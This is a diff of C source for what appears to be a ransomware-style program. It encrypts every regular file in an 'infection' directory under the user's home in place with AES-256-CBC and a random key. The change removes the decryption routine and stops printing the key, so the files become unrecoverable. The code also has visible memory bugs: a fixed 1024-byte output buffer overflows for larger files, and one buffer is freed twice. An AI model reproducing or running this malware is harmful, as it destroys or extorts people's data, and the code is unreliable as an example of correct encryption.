@@ -1,145 +1,83 @@
 #include "encryption.h"
 
-void handle_errors() {
-    ERR_print_errors_fp(stderr);
-    abort();
-}
-
-void encrypt_file(const char *filename, const unsigned char *key, const unsigned char *iv) {
-    FILE *in_file = fopen(filename, "rb");
-    FILE *out_file = fopen("temp.enc", "wb");
-    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-    unsigned char buffer[1024];
-    unsigned char cipher_buffer[1024 + EVP_MAX_BLOCK_LENGTH];
+int encrypt(crypto_params *params) {
+    EVP_CIPHER_CTX *ctx;
     int len;
-    int cipher_len;
 
-    if (!in_file || !out_file || !ctx) {
-        handle_errors();
-    }
+    // Create and initialize the context
+    if (!(ctx = EVP_CIPHER_CTX_new())) return -1;
 
-    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv)) {
-        handle_errors();
-    }
+    // Initialize encryption operation (AES-256-CBC)
+    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, params->key, params->iv) != 1) return -1;
 
-    while ((len = fread(buffer, 1, 1024, in_file)) > 0) {
-        if (1 != EVP_EncryptUpdate(ctx, cipher_buffer, &cipher_len, buffer, len)) {
-            handle_errors();
-        }
-        fwrite(cipher_buffer, 1, cipher_len, out_file);
-    }
+    // Encrypt the plaintext
+    if (EVP_EncryptUpdate(ctx, params->output, &len, params->input, params->input_len) != 1) return -1;
+    params->output_len = len;
 
-    if (1 != EVP_EncryptFinal_ex(ctx, cipher_buffer, &cipher_len)) {
-        handle_errors();
-    }
-    fwrite(cipher_buffer, 1, cipher_len, out_file);
+    // Finalize encryption
+    if (EVP_EncryptFinal_ex(ctx, params->output + len, &len) != 1) return -1;
+    params->output_len += len;
 
+    // Clean up
     EVP_CIPHER_CTX_free(ctx);
-    fclose(in_file);
-    fclose(out_file);
 
-    rename("temp.enc", filename);
+    return params->output_len;
 }
 
-void decrypt_file(const char *filename, const unsigned char *key, const unsigned char *iv) {
-    FILE *in_file = fopen(filename, "rb");
-    FILE *out_file = fopen("temp.dec", "wb");
-    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-    unsigned char buffer[1024];
-    unsigned char plain_buffer[1024 + EVP_MAX_BLOCK_LENGTH];
-    int len;
-    int plain_len;
+void encrypt_files(){
+    crypto_params params;
+    params.key = (unsigned char *)malloc(KEY_SIZE);
+    params.iv = (unsigned char *)malloc(IV_SIZE);
+    params.input = (unsigned char *)malloc(1024);
+    params.output = (unsigned char *)malloc(1024);
+    params.input_len = 0;
+    params.output_len = 0;
 
-    if (!in_file || !out_file || !ctx) {
-        handle_errors();
-    }
+    // Generate random key and IV
+    RAND_bytes(params.key, KEY_SIZE);
+    RAND_bytes(params.iv, IV_SIZE);
 
-    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv)) {
-        handle_errors();
-    }
-
-    while ((len = fread(buffer, 1, 1024, in_file)) > 0) {
-        if (1 != EVP_DecryptUpdate(ctx, plain_buffer, &plain_len, buffer, len)) {
-            handle_errors();
-        }
-        fwrite(plain_buffer, 1, plain_len, out_file);
-    }
-
-    if (1 != EVP_DecryptFinal_ex(ctx, plain_buffer, &plain_len)) {
-        handle_errors();
-    }
-    fwrite(plain_buffer, 1, plain_len, out_file);
-
-    EVP_CIPHER_CTX_free(ctx);
-    fclose(in_file);
-    fclose(out_file);
-
-    rename("temp.dec", filename);
-}
-
-void encrypt_files() {
-    // Path to the infection directory
+    // Get the infection directory
     char path[256];
     snprintf(path, sizeof(path), "%s%s", HOME, INFECTION_DIR);
-
-    // Generate a random key and IV
-    unsigned char key[KEY_SIZE];
-    unsigned char iv[IV_SIZE];
-    if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv))) {
-        handle_errors();
-    }
-
-    // Print key and IV for decryption purposes
-    printf("Encryption Key: ");
-    for (int i = 0; i < KEY_SIZE; i++) printf("%02x", key[i]);
-    printf("\nIV: ");
-    for (int i = 0; i < IV_SIZE; i++) printf("%02x", iv[i]);
-    printf("\n");
-
-    // Open the directory and encrypt each file
     DIR *dir = opendir(path);
     struct dirent *entry;
     while ((entry = readdir(dir)) != NULL) {
         if (entry->d_type == DT_REG) {
             char filepath[512];
             snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
-            encrypt_file(filepath, key, iv);
-            rename_file(filepath);
-        }
-    }
-    closedir(dir);
-}
+            if (!strstr(filepath, ".ft")) {
+                FILE *file = fopen(filepath, "rb");
+                if (file) {
+                    fseek(file, 0, SEEK_END);
+                    long file_len = ftell(file);
+                    fseek(file, 0, SEEK_SET);
 
-void decrypt_files(const char *key_hex) {
-    // Path to the infection directory
-    char path[256];
-    snprintf(path, sizeof(path), "%s%s", HOME, INFECTION_DIR);
+                    unsigned char *plaintext = malloc(file_len);
+                    fread(plaintext, 1, file_len, file);
 
-    // Convert hex key to binary
-    unsigned char key[KEY_SIZE];
-    for (int i = 0; i < KEY_SIZE; i++) {
-        sscanf(&key_hex[i * 2], "%2hhx", &key[i]);
-    }
+                    fclose(file);
 
-    // Use a known IV (must be same as used for encryption)
-    unsigned char iv[IV_SIZE] = {0}; // Use the same IV as used during encryption
+                    params.input = plaintext;
+                    params.input_len = file_len;
 
-    // Open the directory and decrypt each file
-    DIR *dir = opendir(path);
-    struct dirent *entry;
-    while ((entry = readdir(dir)) != NULL) {
-        if (entry->d_type == DT_REG) {
-            char filepath[512];
-            snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
-            if (strstr(filepath, ".ft")) {
-                decrypt_file(filepath, key, iv);
-                // Rename the file back to original
-                char original_filepath[512];
-                memcpy(original_filepath, filepath, strlen(filepath) - 3);
-                original_filepath[strlen(filepath) - 3] = '\0'; // Manually null-terminate the string
-                rename(filepath, original_filepath);
+                    // Encrypt the file
+                    encrypt(&params);
+
+                    // Write the encrypted file
+                    FILE *encrypted_file = fopen(filepath, "wb");
+                    fwrite(params.iv, 1, IV_SIZE, encrypted_file);
+                    fwrite(params.output, 1, params.output_len, encrypted_file);
+                    fclose(encrypted_file);
+
+                    free(plaintext);
+                }
             }
         }
     }
-    closedir(dir);
+
+    free(params.key);
+    free(params.iv);
+    free(params.input);
+    free(params.output);
 }
